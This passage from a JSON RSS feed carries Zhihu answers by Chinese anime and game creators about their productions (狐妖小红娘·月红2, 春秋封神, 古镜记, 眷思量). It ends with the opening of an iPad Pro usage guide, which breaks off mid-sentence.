href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68338"},{"title":"如何评价国产动画《狐妖小红娘·月红 2》？","date":"2021-08-16 11:30:07","description":"\n<p>大家好，我是《狐妖小红娘·月红2》的总导演阿东，很高兴能有机会在知乎与大家分享一下关于这部作品的一些故事。</p>\n<p>5年前我们开始和国内的网络平台合作，关注了一些同时期的动画作品。我是那时候接触到狐妖小红娘的。第一次看了之后的感受是“唉呀！国内现在的二维动画做得这么好了！”在我们和腾讯动漫合作了几年之后，腾讯动漫问我是否有兴趣加入到《狐妖》的制作中来，承制这个特别篇；我马上回答当然啊，因为我很喜欢《狐妖》这部作品，在看原著的时候我也经常被故事里描述的爱情所感动。</p>\n<p>60多分钟的特别篇和番剧不同，故事构成要按照电影方式来讲。时间虽然没有电影长，但做起来难度还不小，所以我们邀请了《海贼王》的导演宇田钢之介来一起担任了总导演。我在日本生活了30多年，除去最初的留学期间，在游戏和动画界已经工作了26年了。我十分喜欢动画，所以特别想在这方面能为祖国的动画发展做些贡献，特别感谢腾讯动漫能给我这个机会。</p>\n<p> “月红篇”是很有人气的，有很多铁粉。不同制作公司有不同的风格，因为也是第一次参与，所以在人设创作时我们尽量去靠近原作月红篇漫画风格，当然，也很欢迎能看到大家的建议，我们之后的制作中也会积极改进的。</p>\n<p>为了让狐妖粉以外的观众也能看懂故事，我们保留了一些番剧动画中用过的情节作为剧情说明，并且追加创作了原作中没有涉及到的情节来满足已经看过动画的观众，希望大家能喜欢这个故事。</p>\n<p>在制作中最大的难点是在短短的60多分钟内要讲一个完整的故事，故事不但要照顾到没有看过狐妖的观众，还要满足狐妖粉对新内容的期待。这个问题在主创人员之间争论了很久。就是作品基本完成之后也是修了再修，剪了又剪，台词和细节表情数轮精修。肯定还有不够到位的地方，但是我们是怀着真诚的心情来制作的。东方月初和红红的爱情令人很感动，这不是一个常规的、脸谱化的、按部就班的故事，那么如何能在60分钟内传达给大家我们的感动是挺困难的一个事，很多情节都是反复斟酌后为了整体做的取舍。最初是由腾讯动漫这边和作者沟通讨论之后给我们一个故事构架和方向，包含了基本的故事逻辑，还有很多精彩的点子因为篇幅的限制没能够用上，希望之后还有机会做出来。我们在那个基础之上进行了故事构成，我们主创人员在进行讨论后，由编剧将内容整理出来，再提交审查，先确定节奏取舍，再精修台词，然后我们根据反馈的意见再进行调整。就这样反反复复的打磨了很多次。剧本创作用了很长时间才定稿的。虽然很辛苦，但我们的目的是统一的，就是要讲好这个故事。</p>\n<p>去年3，4月份开始因为疫情，东京戒严封城。当时因为是第一次遇到这种紧急情况，所以很混乱，街上真是没有人。而且因为安全的关系，我们一度无法集中在一起办公，对于消息的传达和进度都带来了不小的影响。一位关键的执行导演还确诊倒下了，我们只能安排人每天去给他送饭。说实话当时真有点恐慌！一方面是为了我们团队成员的安全担心，另一方面很害怕不能好好的做好这部作品，好在我们最后还是做出来了，希望大家能够喜欢。</p>\n<p>近年来随着国产动画的不断进步，我这边会陆陆续续收到咨询，问日本这边动画行业的状况。其实制作动画的过程还是挺辛苦的，经常熬夜。尤其是作画环节，作息时间几乎和正常人是拧着的。几乎都是下午3，4点开始工作到早晨3，4点。然后上午去睡觉。上午如果有急事想找人的话是很难联系到的。因为大家都很辛苦，所以有事也会尽量避开上午时间。不过看到作品做出来的一刻内心还是非常的满足。希望想入行的大家也做好心理准备，这一行没有足够的热爱很难坚持下去的。</p>\n<p>这个特别篇是很好看的，我们制作团队内部是很喜欢的，希望大家也能够喜欢。如果观众能觉得“还不错嘛”，对我们制作者来说就是最大的安慰和鼓励了。我记得自己刚进电影学院的第一堂课老师就讲“电影是个遗憾的艺术”。的确，这个网大特别篇我们也有很多遗憾，在以后的作品里我们也会尽量去做好来减少“遗憾”，一步一步向前走。</p>\n<p>最后，借此机会我再次感谢腾讯动漫能给我们这个机会，我们认同这种有更多制作方参与到作品中来，让作品最终能往更好的方向发展的理念。我很喜欢《狐妖小红娘》，也诚恳的希望大家能给我们建议，无论是好的还是坏的，这都能帮助我们之后做的更好。感谢制作组每位工作人员，感谢大家对我们的支持和鼓励。谢谢！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/you-mao-zhi-ren?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">阿东</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/479520750/answer/2063275424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">43 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/330843294?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">推荐几部国漫，类似于天行九歌，斗罗大陆，狐妖小红娘的？</a><br><a href=\"http://www.zhihu.com/question/459306315?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没优秀国漫推荐啊。类似我喜欢的秦时明月，西行记，武庚纪，天行九歌，一念永恒？</a><br>\n","link":"http://www.zhihu.com/question/479520750/answer/2063275424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《春秋封神》？","date":"2021-08-13 11:30:10","description":"\n<p></p>\n<p>      大家好，我是动画番剧《春秋封神》的导演李家豪。经过将近两年的紧张制作，这部作品终于能赶在暑期档跟大家见上面了，借这个机会先由衷地感谢一下我们创作团队以及外包制作团队中的每一位成员，感谢大家为这部作品所倾注的心血，谢谢。</p>\n<p>按照惯例先简单跟大家分享一下我们在制作以及创作上的方方面面：</p>\n<a href=\"https://www.zhihu.com/video/1409292364661395458\">用游戏引擎制作动画</a><p>      已经看过前几集的小伙伴应该对上面视频的场景留有印象，《春秋封神》正是基于UE4引擎所制作的作品，对于喜爱玩游戏的小伙伴来说UE4引擎并不算陌生，但是利用游戏引擎来做动画相信大家了解得就比较少了。《春秋封神》运用了大量的引擎新技术，为了全流程跑下来，我们团队还为此开发了一系列的插件用以辅助。总而言之相较于传统动画流程来说，引擎“所见即所得”的特性是极大地提升了导演以及各环节制作人员们的创作空间。</p>\n<a href=\"https://www.zhihu.com/video/1409292678819880961\">动画中的国风舞蹈</a><p>      动作捕捉现场也是制作的重要阵地之一。对于动作捕捉技术，近些年来在国创作品中的应用也是越来越广，为了使《春秋封神》里面的角色“活”起来，我跟团队的小伙伴辗转了全国各大动捕中心，只为了寻找到最理想的动捕技术支持。</p>\n<a href=\"https://www.zhihu.com/video/1409293807939084288\">动画分镜正式制作前的预演</a><a href=\"https://www.zhihu.com/video/1409293981222490112\">角色动作预演</a><p>      小伙伴正在预演中。为了让我们的分镜以及动画师们能快速理解一场戏的表演意图，我们用上了各种手段，在这个过程也有很多欢乐的时刻。在我看来，我们的动画作品想要不断地突破，不仅需要技术革新，创作流程的创新也同样重要。</p>\n<p>   当然以上所展示的只是整部作品诞生过程中的一小部分环节。相对于制作流程，我更想跟大家聊的是创作心得。《春秋封神》是一部漫改作品，这部作品动画化的改编难度还是比较高的，原著的故事很精彩，但是述事的风格相对比较碎片化，并且是双线述事，观感上对于漫画来说问题不大，但对于如何梳理出适合动画节奏的主线，又能照顾到原著粉的情怀，就成了我们最初所面临的最大困难。在立项之初，我们比较坚定的一点就是，既然是改编，那么我们必须得做到尊重原著，在忠于原著的前提下，充分保留原著精华，去强化原著中的戏剧冲突，在思考如何将子殇、韩箕、小姒、幽王这些角色的命运纠葛展现得更深刻，将角色塑造得更为深入人心等方面，我们作了不少思考。同时，这部作品的背景设定很庞大，整个世界由天界、人界、妖界等力量体系构筑，为了让故事形成逻辑自洽的剧情脉络，又能更好地展现每一个角色的心路变化和成长历程，我们选择规避了会容易造成审美疲劳的爽文固有模式，更加注重着墨于不同主角内心的蜕变与成长，抛开固有的主角“打怪升级谈恋爱”套路，以双视角去讲述人世间的风风雨雨，爱恨情仇，引领观众一同感受角色们的冒险历程，而随着剧情的进展，观众会更加详细地了解到整个世界观，并且去认识每一个角色，为此这部作品可能会相对慢热，观众可以期待当所有线索并联时，最终汇聚成一点的时候的爆发力。</p>\n<p>《春秋封神》目前还在爱奇艺周更中，暑期还特别开启了周双更福利。希望更多的观众能够关注到这部作品，感谢。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jiahao-83-48?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">jiahao</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477793717/answer/2056504454?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/471142455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">话题：如何评价《春秋封神》动画？</a><br><a href=\"http://www.zhihu.com/question/392443599?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待曾承诺全本免费的国漫《战国千年》因人气暴增开始收费的行为？</a><br>\n","link":"http://www.zhihu.com/question/477793717/answer/2056504454?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国风推理游戏《古镜记》？","date":"2021-08-13 03:00:10","description":"\n<p>我来回答这个问题。</p>\n<p>建议大家去看一下制作人小鸡的照片。</p>\n<p>清丽脱俗，天香佳人。</p>\n<p>第一次见到她的时候，我心想，这样的女孩子，怕是有点才华哦。</p>\n<p>那之前，她只去上海某公司上了一天班，便快速逃离了那种令人不快的环境。</p>\n<p>当然，之后因为很神奇的原因，她最终进入了胖布丁。</p>\n<p>我明白她的作品不错，我也明白她的能力不错，只是，那时候，我们还在做着迷失岛2，还在那些粗犷凛冽的美术线条中打转。她试着学习我的风格画了一些场景。画得不错，但是还是和我的原始风格有差别。</p>\n<p>所以，我一直想，她值得有机会做一些她能更好驾驭的风格。</p>\n<p>刚好，那时候我在写一些未来游戏开发计划。写好后，叫大家传看，选择自己觉得合适的发挥起来。</p>\n<p>从《三言两拍》中择取一段有趣的故事，改编，做成解谜游戏。就是《古镜记》的来源。</p>\n<p>当然，胖布丁这么多人，想来，也只有小鸡能立马选择这一主题。</p>\n<p>非常适合她，如她这样一位古典气质的奇女子，义不容辞，当仁不让啊！</p>\n<p>《古镜记》有一种优雅、古拙、华美的色彩。</p>\n<p>《古镜记》讲了一段隽永、深情、迷人的故事。</p>\n<p>《古镜记》是一个雅致、精巧、奇幻的游戏。</p>\n<p>把上面三段话中的色彩、故事和游戏，换成小鸡的名字，也很适合。</p>\n<p>我想这就是合格的独立游戏游戏制作人所能带给游戏的个性气质。</p>\n<p>当然，胡桃的动画精美到令人屏息，而蒋同学的程序就好像是所有这一切的基石。</p>\n<p>还有那些为了这个游戏付出一切的人。</p>\n<p>他们所有的灵魂都能在这款独立游戏中找到一一对应点。</p>\n<p>所以说，在我看来，这是一款有灵魂的游戏。</p>\n<p>我知道我该谢谢他们，因为他们让胖布丁变得更好。</p>\n<p>《古镜记》也许在别人看来，不是一款满分的作品。或多或少，总有一些缺陷。</p>\n<p>但是在我看来，一群人付出了百分百的努力，做了这些许年，得到了这样一个作品。无论如何，对他们和对我而言，这就是一款满分的作品。</p>\n<p>好吧，再写下去，大家会觉得我们在自我陶醉了。</p>\n<p>那么，讲一段不自我陶醉的故事吧。</p>\n<p>为了得到一段合适的音乐，小鸡找到了一位音乐创作人，几经周折后，主题曲被创作出来了。</p>\n<p>第一次听这首歌，《今夜果实成熟时》，我心想，这啥玩意啊，完全接受不了啊。</p>\n<p>但是小鸡对这首歌曲很满意。</p>\n<p>我想，我是不是老了。所以我给小鸡说：我接受不了，但是，重要的是，你满意就好。</p>\n<p>后来，每天，大家做游戏片头动画的时候，我都能在公司的各种场合听见这首歌。</p>\n<p>慢慢地，歌曲入我耳也能动听起来。后来，我还能不自觉的哼唱。</p>\n<p>再后来，我把这首歌拿给我12岁的小侄女听，她听了一遍后，就极其喜欢，循环播放了一天。</p>\n<p>我想，我确实是老了啊。</p>\n<p>不过，这正是我开心的原因。</p>\n<p>我在胖布丁的每一天，都能和这些有着无穷才华的年轻人一同工作，一同成长，这，让我的游戏开发岁月，变得更加的笃定和有意义。</p>\n<p>作为一个创作者，就如同登上了一辆充满斗志的时间列车，开往更年轻的激动人心的未来啊！</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiao-mian-hua-29-45?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小棉花</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/479155481/answer/2056589796?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">91 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/267230517?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你知道怎么写游戏设计文档（Game Design Document）么？</a><br><a href=\"http://www.zhihu.com/question/23139838?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《Paper, please》这款游戏？</a><br>\n","link":"http://www.zhihu.com/question/479155481/answer/2056589796?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《眷思量》第十集？","date":"2021-08-12 15:30:09","description":"\n<p>自从上周最后两集特效收完尾，周末头一次花了不少时间在眼睛的康复治疗上，也算趁机多闭目养神休息一下，一直以来为了肝片子平时每天4小时睡眠都保证不了 ，确实扛不住了 ，于是周一又没有完成知乎君的更新任务 orz。。。</p>\n<p>而且这次准备的是一些灯光制作上的，编辑起来确实要多花一些时间，今天项目会也不少，断断续续这会才弄完 。</p>\n<p>下面就来分享下这集光影设计的一些点。</p>\n<p>开篇镜玄披皮救场这段戏，原本中期给的是按实际灯光环境铺的，比较平的光，我希望能显出“恒老”像一道希望之光一样，于是做了相应P图指示，以背光勾边衬托的方式调整了登场思路：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d9677f7a22dc8d795e40faef37db343d_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1119\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d9677f7a22dc8d795e40faef37db343d\" data-watermark-src=\"v2-bba5b19a38bfe6615247b6b2dc9048d2\" data-private-watermark-src=\"v2-2eed85cf990eef33452549e85edeff1a\"></p>\n<p>走进的这里，尤其要衬托出恒老和前后层人物的空间感，以光影分割最为合适。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d78589fa310e5a130fe8548035c7ce10_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1134\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d78589fa310e5a130fe8548035c7ce10\" data-watermark-src=\"v2-405c6b6012aa4c57f27770da43664be5\" data-private-watermark-src=\"v2-268b4833877e011715a2945288486247\"></p>\n<p>同时配合恒老的场光，其他角度也做相应补光。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-291cf4e6d54bdf1633ce8b1d965c3dcc_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1123\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-291cf4e6d54bdf1633ce8b1d965c3dcc\" data-watermark-src=\"v2-5be844cbd8c134f583a4c2c0c5a48206\" data-private-watermark-src=\"v2-51b6b7c332239e30414a70fed3dedf90\"></p>\n<p>但是到了下面这个角度，观察思路又换了一套，从眼睛的自主调节能力去考量，前景人物背光感增强能更凸显空间感以及分割室内气场环境，空气感的表达会更明显。再加入正上方天光和水面光晕反光完成这镜的灯光设计。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-37c9333dc46c890c1fbc958037abb047_720w.jpg?rss\" data-rawwidth=\"1748\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-37c9333dc46c890c1fbc958037abb047\" data-watermark-src=\"v2-e2df58ad11ec2fe694c2917b0a1959d3\" data-private-watermark-src=\"v2-47b5b123c9e5c16200639665a906b5d1\"></p>\n<p>“恒老”到柴房给丽崽松绑这段戏，为了继续贯彻恒老的出现像光一样，以及恒老和长老会叙旧交涉，时间已经过度到快夕阳的时段，这两个隐藏含义，于是开门后，对室内有一个暖光的投射。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9c0c84627ff64aca705361b0558d101a_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2264\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-9c0c84627ff64aca705361b0558d101a\" data-watermark-src=\"v2-a0cb8d30e75396d21131d0c3b8730258\" data-private-watermark-src=\"v2-7d2b282a59719f60f938b288e9a30a93\"></p>\n<p>夕阳登山这场戏，中期原本的灯光时段不太明显，于是P图调整到夕阳氛围，然后又加了云雾，让整座山沐浴在金光里，想表达虽然玄哥在这里生气了，但是出于他内心对丽崽的关心，整个氛围还是充满暖意的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3e7bb301a776275f7df9c26333d59f5_720w.jpg?rss\" data-rawwidth=\"1757\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f3e7bb301a776275f7df9c26333d59f5\" data-watermark-src=\"v2-62bd7d057f9bd24eee1d020d78eb99c1\" data-private-watermark-src=\"v2-db40aab251bd320eb290e50704bd4f3d\"></p>\n<p>以及大家可能以为片中场景原本就是那个样子，其实不全是~有不少是需要确定镜头后，单独针对镜头做细化的。需要出图来配合，然后三维场景组配合资产加细，再渲染出来拿给我审核。这也是平时让我分身乏术的镜头细化工作内容之一 ，比如下面这个例子。为了场景氛围，增加了植被层次，调整了植物形态，替换了天空，调整了光影等。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3dc66e4b8e2ebfb9947a42fd6b3d8424_720w.jpg?rss\" data-rawwidth=\"1801\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3dc66e4b8e2ebfb9947a42fd6b3d8424\" data-watermark-src=\"v2-27dc9b7eccdf7e005511dd5369f6c717\" data-private-watermark-src=\"v2-091eff21b7669aa757684bac23316aff\"></p>\n<p>以及大家也许以为任何灯光下角色都很漂亮，其实也不是，为了让角色们每场戏面部看起来尽量完美，我的要求比较高，需要调整到我满意为止。是需要每场都盯一下的。</p>\n<p>主角们的镜头可能会出现下面的情况，</p>\n<p>1.面光油腻</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e5ad0427506887b2c73ad4871b2d710d_720w.jpg?rss\" data-rawwidth=\"1745\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e5ad0427506887b2c73ad4871b2d710d\" data-watermark-src=\"v2-3bd4bad6b1ca909ff974cdf6f43cf8ae\" data-private-watermark-src=\"v2-26201f1f2636180b27677249d739b4ed\"></p>\n<p>2.补光不够，角色面部暗沉</p>\n<p><img src=\"https://pic1.zhimg.com/v2-af30ad48ebeac240ce282bde1b8abbc7_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2277\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-af30ad48ebeac240ce282bde1b8abbc7\" data-watermark-src=\"v2-dcd2ea951028e344581dcd956210bf15\" data-private-watermark-src=\"v2-7ac4e6c83050d350c2fbe5a115f2e51c\"></p>\n<p>程灼这镜中期给的原灯光较平，不够凸显环境氛围以及程灼此时的心境，所以做了P图修正，这样密林深处的环境氛围也更加明显。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c85e2f64a8d246f334529141c1482390_720w.jpg?rss\" data-rawwidth=\"1333\" data-rawheight=\"2331\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c85e2f64a8d246f334529141c1482390\" data-watermark-src=\"v2-35f70a5988eee09c9fdb70a8999d41f2\" data-private-watermark-src=\"v2-ed3e95eccad003d384ed748906a57a03\"></p>\n<p>好啦！这次先分享这些了，得赶紧奔赴项目会了 ~</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/478348101/answer/2055862496?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">35 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/480037354?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第十一集？</a><br><a href=\"http://www.zhihu.com/question/476668782?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第九集？</a><br>\n","link":"http://www.zhihu.com/question/478348101/answer/2055862496?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"iPad 使用指南 2021","date":"2021-08-12 13:15:07","description":"\n<p>今年是我毕业的第五年，也就是说，iPad 已经整整伴随我八年了。我不知道我自己在这八年里是不是有着足够大的进步，但我知道，至少 iPad 变化很多。现在，我正在用 2021 版的 12.9 英寸 iPad Pro 写下这篇文章，我的背包里，还躺着一台 2021 版 11 英寸 iPad Pro。</p>\n<p>显然，我比以前更加依赖 iPad 了。</p>\n<p>这不是我第一次写 iPad Pro 使用指南了，但距离上次写也过了很长时间，iPad 在我的工作和生活中扮演的角色也发生了变化，所以现在也是一个很合适的时间，再来聊一聊这件事。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0d469721fdbbf3e808eb892930317b9b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic4.zhimg.com/v2-0d469721fdbbf3e808eb892930317b9b_r.jpg\"></figure><p>可能是因为年纪开始变大了，我已经不再喜欢和人争论。尤其是当任何场所提起 iPad Pro 的时候，「它是不是生产力工具」这件事已经变得像人类那些无解的永恒命题一样。所以，如果你期待在这篇文章中获得这个问题的答案，你可能要失望了，因为我不会回答。以及如果你看完本文，依然想要评论：</p>\n<p>「iPad Pro 就是没有生产力。」</p>\n<p>那我就说一句你都对吧。</p>\n<p>而如果你并不纠结于此，无论你现在是不是已经拥有了一台 iPad Pro，这篇文章的目的都是为了能够让你和 iPad Pro 找到合适的连接方式。我们都知道苹果设备的包装内都不包含说明书，但我希望这篇文章可以成为 iPad Pro 最好的说明书，而这本说明书并非冰冷的操作手册，而是在你和 iPad Pro 之间，做好人与机器之间的传递语言。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6b7276469b6c4282650373538bcf4ca5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-6b7276469b6c4282650373538bcf4ca5_r.jpg\"></figure><p>在这篇说明书中，我将会从三个角度展开。</p>\n<p>首先是产品的形态，在这一部分中，我会尝试回答「到底什么是 iPad」。</p>\n<p>其次是产品的使用，我尝试分享具体的使用经验，尽可能给出清晰的工作流。</p>\n<p>最后是产品的购买，尤其是针对尺寸、配置和配件给出更为针对性的参考。当然，在这一环节中，我也将会明确指出它现在并不适合哪些工作，避免消费浪费。</p>\n<p>需要说明的是，在 2021 年谈 iPad ，潜台词就应该是 iPad Pro，或者说是指 iPad Pro 配合 Apple Pencil 的这种产品形态。所以在本文中，将会用 iPad 代指 iPad Pro、iPad Air 以及任何能够使用 Apple Pencil 的 iPad。</p>\n<h2>把灵感扣在玻璃里</h2>\n<p>用所谓的「移动设备尺寸」的思维来理解 iPad 是过时的。今天的 iPad 绝不是介于所谓 iPhone 和 Mac 的一种中间形态，更不是乔布斯第一次拿出 iPad 时的客厅之友。尤其是 iPad Pro 产品线的出现让整个产品逻辑都发生了根本性的变化。</p>\n<p>在 iPad Pro 出现之前，它是最好的内容消费工具这是因为它是最为纯粹的以「屏幕」为核心的电子设备。在 iPad 诞生之初因为没有内容输入的压力，所以没有额外的任何内容生产的硬件负担。而今天所有的内容消费基本上都是通过屏幕完成的，所以 iPad 在这方面有着天然的优势。</p>\n<p>无论是电子阅读时代，还是今天的视频内容时代，iPad 系列产品都是体验最为均衡的选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-16c6955fa9bdcb895f6e587c491c5ed3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-16c6955fa9bdcb895f6e587c491c5ed3_r.jpg\"></figure><p>但是自从 iPad Pro 的出现，iPad 就不仅仅需要来完成「内容消费」的工作，它需要进行「内容生产」，但这种生产是需要「输入方式」，而且这种输入方式也是在不断变化的。</p>\n<p>在设计之初，iPad Pro 是利用 Apple Pencil 的「书写输入」进入细分市场。我现在还记忆犹新，2017 年采访设计师、插画师能不能代替数位板时他们还坚定地说不能。但是时间已进入 2018 年，不论是艺术家也好，从业者也好，只要跟绘画相关的行业，人手一台。</p>\n<p>出现这种改变一个很重要的原因是第二代 Apple Pencil 随着 2018 款 iPad Pro 问世。它创新地解决了两个对于触控笔来说最难的问题，充电以及收纳。磁吸附的设计，基本上也引领了后来其它品牌的触控笔解决方案。当然，硬件只是其一，Procreate 的出现也在软件上填补了空白，这款完全为绘画工作者设计的软件，今天几乎成为了绘画工作者的首选。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-e69823b00ce2aa3ef35e866c3ca90510_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-e69823b00ce2aa3ef35e866c3ca90510_r.jpg\"></figure><p>而随着 iPad Pro 被绘画的细分市场认可以后，使用 iPad Pro 的用户数量逐渐增多。尤其这几年 iPad Pro 的硬件设计在整个苹果产品线中都是最为打动人的一个，于是 iPad Pro 开始逐渐进入大众消费市场。当然，并不是人人都是插画家，所以 iPad Pro 需要满足更加多元的内容创作。因此，苹果也为 iPad Pro 带来了传统桌面的输入方式，也就是键鼠。</p>\n<p>首先，iPad Pro 其实一直对于键盘有着很好的支持，甚至是在 iPad 诞生初期就有官方的键盘配件。但是鼠标就不同了，因为这是完全桌面端的交互方式。但苹果依然用自己优秀的软件设计能力，给出了非常出色解决方案，它既保留了一定的触控特性，又不会让你在使用过过程发觉和使用 Mac 的鼠标有何不同。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-874d6698d5a8aa5c78ae7b7de79f625c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-874d6698d5a8aa5c78ae7b7de79f625c_r.jpg\"></figure><p>而键鼠的出现，也终于解决了文字工作者的最后一块心病，终于不用抬手换行了。</p>\n<p>所以这也带来一个很奇特的现象，这就是 iPad Pro 几乎拥有目前市面上所有的「内容输入方式」。它就像是一个变形金刚。</p>\n<p>或者说，是一个积木。</p>\n<p>所以从这个角度出发，iPad Pro 像是一个可以「定制」的电子产品。虽然这样的定制，意味着消费者需要对配件进行选择，但是这也让每一个消费者类别带来最为纯粹的体验。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-02ca6a7d97fec6103bc5a09e8786903d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-02ca6a7d97fec6103bc5a09e8786903d_r.jpg\"></figure><p>比如，如果你只是单纯的内容消费，那么只需要购买 iPad Pro 本体。没有了键盘这些负担，就是最好的「爱奇艺启动器」。</p>\n<p>比如，如果你的工作与「笔」有关，不管是记笔记，还是画画，那么加上一根 Apple Pencil 